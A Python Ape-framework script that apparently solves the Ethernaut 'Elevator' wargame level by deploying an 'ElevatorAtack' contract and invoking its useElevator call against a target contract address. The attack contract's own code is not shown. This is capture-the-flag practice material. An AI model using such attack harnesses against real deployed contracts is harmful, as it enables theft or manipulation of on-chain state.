from ape import project, accounts, chain
from scripts.helpful_scripts import get_account


def deploy_elevator():
    # account = accounts.load("ethernaut")
    account = accounts.test_accounts[0]
    elevator_contract = account.deploy(
        project.Elevator,
        # max_priority_fee="0.5 gwei",
        # max_fee="1 gwei",
        # sender=account,
        # publish=True,
    )
    return elevator_contract


def deploy_elevator_atack(address):
    account = accounts.load("ethernaut")
    elevator_atack_contract = account.deploy(
        project.ElevatorAtack,
        address,
        max_priority_fee="0.5 gwei",
        max_fee="1 gwei",
        sender=account,
        publish=True,
    )
    return elevator_atack_contract


def invoke_attack():
    account = accounts.load("ethernaut")
    # elevator_atack = project.ElevatorAtack.deployments[-1]
    elevator_atack = project.ElevatorAtack.at(
        "0x6F222eC431bdc0e079AC3dc2D529E949081CcE24"
    )
    elevator_atack.invoke_transaction(
        "useElevator",
        5,
        max_priority_fee="0.5 gwei",
        max_fee="1 gwei",
        sender=account,
    )


def main():
    invoke_attack()
    # deploy_elevator_atack("0x357AEfE75b2505bDf21aCC44D6d4A4627da49f40")
